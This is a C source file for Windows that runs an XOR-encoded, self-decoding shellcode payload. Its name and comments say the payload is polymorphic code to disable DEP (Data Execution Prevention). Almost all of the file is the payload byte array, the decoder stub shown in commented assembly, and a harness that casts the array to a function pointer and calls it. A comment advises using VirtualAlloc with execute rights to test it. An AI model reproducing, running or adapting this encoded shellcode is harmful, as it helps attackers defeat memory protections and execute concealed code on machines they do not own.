
#include <windows.h>


int main() 

{ 
// this is decoder stub , which the shellcode  is preceded with , it simply xor's it with 'DEADC0DE' 
/*
__asm 
	{   
	 call eip 
eip : 
	    pop edx  //get EIP 
        add edx , 0x26  //  (decoder)EIP + addr of shellcode  
		xor eax , eax 
		xor ecx , ecx 
		
decoder:	
	    mov eax , dword ptr [shellcode + ecx]	 
        xor eax , 0xDEADC0DE  //decrypt 
        mov ebx ,  edx
		add ebx , ecx 
		mov dword ptr [ebx] , eax 
        add ecx , 4
		cmp ecx , 0x450 
		jz done  
		jmp decoder
done :     
	}
*/
 //0x450 bytes !
 char DisableDEPPolymorphic3vilC0de[] = 
   "\xE8 \x00\x00\x00\x00\x5A\x83\xC2\x26\x33\xC0\x33\xC9\x8B\x81\x00\x50\x34\x01"
"\x35\xDE\xC0\xAD\xDE\x8B\xDA\x03\xD9\x89\x03\x83\xC1\x04\x81\xF9\x50\x04\x00"
"\x00 \x74\x02\xEB\xE2" // decoder 
//shellcode 
"\x8b\x26\x2c\x5f\x32\xb5\xc2\xde\xde\xfe\x96\x89\x53\x10\x28\x23\x21\x52\x79\x58"
"\xde\xad\xc0\x66\x12\x61\xc\x12\x2d\x6\x78\xb5\xde\xad\xc0\xb8\x57\xe8\x10\x66"
"\xbb\xad\xc0\xde\xb8\x24\x85\xc\x66\xdf\xc0\xde\xde\xcb\x49\x9b\xa\x15\xae\xde"
"\xde\xad\xa6\x57\x9b\x7b\x78\xbb\xde\xad\xc0\xb8\x57\xe8\x18\x66\xb2\xad\xc0\xde"
"\xb8\x24\x85\x4\x66\x9e\xc0\xde\xde\xcb\x49\x9b\x2\x15\xf2\xde\xde\xad\xa6\x57"
"\x9b\x73\x78\xf0\xde\xad\xc0\xb8\x57\xe8\x20\x66\xba\xad\xc0\xde\xb8\x24\x85\x3c"
"\x66\xc1\xc0\xde\xde\xcb\x49\x9b\x3a\x15\xac\xde\xde\xad\xa6\x57\x9b\x4b\xf3\x1e"
"\xb8\x24\x85\x36\x53\xe8\x10\x57\x9b\x55\xf3\x1e\xb8\x24\x85\x2a\x66\xb7\xc0\xde"
"\xde\xcb\x49\x9b\x28\x6a\x85\x7e\xde\xad\xc0\xde\x19\xe8\x54\xde\xde\xad\xc0\x19"
"\x9b\x25\xc0\xde\xde\xad\x7\x5b\xa2\x52\x3f\x21\xde\xad\xc0\xde\x19\x28\xb0\x21"
"\x21\x52\xc0\xde\xde\xad\x7\x5b\xba\x52\x3f\x21\xde\xad\xc0\xde\xba\xc\xf0\xde"
"\xde\xad\x4b\x9e\xd2\x26\x98\xd2\x57\x30\xa4\x21\x21\x52\x78\xdf\xde\xad\xc0\x5b"
"\x1e\xd9\x9e\x19\x9b\xd\xc0\xde\xde\xad\x2b\xd7\x55\xe8\x60\x5d\x1e\xac\x49\x9b"
"\x7e\x2e\xbd\x7e\xd2\xd0\xe2\x55\x9b\xd\x4b\x93\x26\xa2\x77\xca\x9f\x26\x45\xba"
"\x21\x52\x3f\x55\x96\x9d\x4b\x9b\x7e\xa2\x77\xd2\x9f\x96\x11\xaa\xdc\x46\xc2\x35"
"\x11\x2e\xbd\x7e\xd2\xd8\xce\x55\x5b\xc9\x3f\x21\x21\x26\x88\xc6\x57\xe0\x54\x35"
"\xce\x26\x45\xba\x21\x52\x3f\x55\xd6\x24\x4d\xba\x21\x52\x3f\x35\x47\x26\x85\x4a"
"\x57\xe8\x48\x55\x9b\x25\x4b\x93\x4a\xae\x88\xe2\x57\x20\xbc\x21\x21\x52\x4b\x5b"
"\xa2\x52\x3f\x21\x55\xe5\xb8\x57\x53\xdd\x3f\x21\x21\x26\x85\x4a\xdd\x28\xb0\x21"
"\x21\x52\x49\x5b\x86\x52\x3f\x21\x55\x28\x98\x21\x21\x52\x4b\x93\x4a\xae\x88\xfe"
"\x57\x20\x8c\x21\x21\x52\x4b\x5b\x86\x52\x3f\x21\x55\xe0\x54\xdd\x96\xb1\x49\x53"
"\x9e\x52\x3f\x21\x18\x28\xe8\x21\x21\x52\x87\x18\x5b\x84\x3f\x21\x21\xc8\x6\x5b"
"\xf4\x52\x3f\x21\xaa\x6b\x45\xf5\x21\x52\x3f\x8e\x18\x28\xec\x21\x21\x52\xb2\x18"
"\x5b\x80\x3f\x21\x21\xc2\x6\x5b\xf0\x52\x3f\x21\xbd\x6b\x45\xf1\x21\x52\x3f\x9f"
"\x18\x28\xf0\x21\x21\x52\xa4\x18\x5b\x9c\x3f\x21\x21\xc9\x6\x5b\xec\x52\x3f\x21"
"\xac\x6b\x45\xed\x21\x52\x3f\xbb\x18\x28\xf4\x21\x21\x52\xb3\x18\x5b\x98\x3f\x21"
"\x21\xde\x6\x5b\xe8\x52\x3f\x21\xde\x6b\x45\xce\x21\x52\x3f\x92\x18\x28\xd1\x21"
"\x21\x52\xaf\x18\x5b\xbf\x3f\x21\x21\xcc\x6\x5b\xcd\x52\x3f\x21\xba\x6b\x45\xca"
"\x21\x52\x3f\x92\x18\x28\xd5\x21\x21\x52\xa9\x18\x5b\xbb\x3f\x21\x21\xcf\x6\x5b"
"\xc9\x52\x3f\x21\xac\x6b\x45\xc6\x21\x52\x3f\xbf\x18\x28\xd9\x21\x21\x52\xb2\x18"
"\x5b\xb7\x3f\x21\x21\xd4\x6\x5b\xc5\x52\x3f\x21\x9f\x6b\x45\xc2\x21\x52\x3f\xde"
"\x19\x28\xc4\x21\x21\x52\xc0\xde\xde\xad\x7\x5b\x26\x53\x3f\x21\xde\xad\xc0\xde"
"\x19\x28\x2c\x20\x21\x52\xcf\xde\xde\xad\x7\x5b\x3e\x53\x3f\x21\xde\xad\xc0\xde"
"\x19\x28\x14\x20\x21\x52\xc0\xde\xde\xad\x4d\x5b\xf6\x52\x3f\x21\x57\x28\x8\x20"
"\x21\x52\x4b\x5b\x86\x52\x3f\x21\x55\xe0\x60\xe5\x96\xb5\xcf\x5d\x3b\xad\xc0\xde"
"\x5d\x10\x38\x20\x21\x52\xc1\xab\xc8\x6a\x45\x32\x20\x52\x3f\xd3\xde\xad\xc0\x53"
"\x5b\xbd\x3f\x21\x21\x24\x45\x16\x20\x52\x3f\x55\x9b\xd\x4b\x53\x92\x52\x3f\x21"
"\x55\xf8\x54\xdd\xca\x2c\x49\x4b\xa\x53\x3f\x21\x19\x28\x20\x20\x21\x52\xc0\xde"
"\xde\xad\x2b\xd1\x55\x28\x20\x20\x21\x52\x43\x1e\xdf\x24\x45\x3e\x20\x52\x3f\x55"
"\x5b\x4d\x3e\x21\x21\x96\x45\x32\x20\x52\x3f\xa3\xf8\x26\x45\x16\x20\x52\x3f\xdd"
"\x5b\x4d\x3e\x21\x21\xa2\x7e\xd6\x55\x38\x14\x20\x21\x52\xc3\x4b\x3e\x53\x3f\x21"
"\xd1\x13\xc2\xe5\x16\xd9\xc2\x35\xdc\x46\x7d\x55\x5b\x4d\x3e\x21\x21\x96\x45\x32"
"\x20\x52\x3f\xab\x98\x2e\x7d\x26\x20\x52\x3f\xdf\xab\x8d\x4b\x9b\x7e\x26\x4d\x9e"
"\x21\x52\x3f\x55\x8b\x39\xc3\xca\x5f\x24\x95\x66\x19\x28\xc4\x21\x21\x52\xc1\xde"
"\xde\xad\x2b\xf3\x35\xb0\x7\x5b\x26\x53\x3f\x21\xdf\xad\xc0\xde\x55\xe8\x60\x55"
"\x53\xed\x3f\x21\x21\x26\x95\x4a\xdd\xf9\x41\xda\x57\xf8\x4\x55\x9b\xd\x43\x1e"
"\xdf\x24\x85\x7e\x37\xa4\x3f\x21\x21\x6b\x45\x72\x20\x52\x3f\x8d\x18\x28\x6d\x20"
"\x21\x52\xa5\x18\x5b\x3\x3e\x21\x21\xd9\x6\x5b\x71\x53\x3f\x21\x8e\x6b\x45\x6e"
"\x20\x52\x3f\xac\x18\x28\x71\x20\x21\x52\xaf\x18\x5b\x1f\x3e\x21\x21\xce\x6\x5b"
"\x6d\x53\x3f\x21\xbb\x6b\x45\x6a\x20\x52\x3f\xad\x18\x28\x75\x20\x21\x52\xb3\x18"
"\x5b\x1b\x3e\x21\x21\xe9\x6\x5b\x69\x53\x3f\x21\x9b\x6b\x45\x66\x20\x52\x3f\x8e"
"\x18\x28\x79\x20\x21\x52\x90\x18\x5b\x17\x3e\x21\x21\xc2\x6\x5b\x65\x53\x3f\x21"
"\xb2\x6b\x45\x62\x20\x52\x3f\xb7\x18\x28\x7d\x20\x21\x52\xa3\x18\x5b\x13\x3e\x21"
"\x21\xd4\x6\x5b\x61\x53\x3f\x21\xde\x26\x34\x53\x5b\x1\x3e\x21\x21\xfd\x4b\x93"
"\x4a\xfc\x3f\x8b\x1a\x96\x34\x4e\x4e\x3d\x50\x4e\x57\xe8\x6c\x55\x2a\xc7\xc0\x21"
"\x8b\x1\x50\x4e" ;
 
 // to test the shellcode ,it is recommended to use virtualalloc API with "EXECUTE" attribute is set !!
 
(*(int(*)()) DisableDEPPolymorphic3vilC0de)();

return 0 ;
}



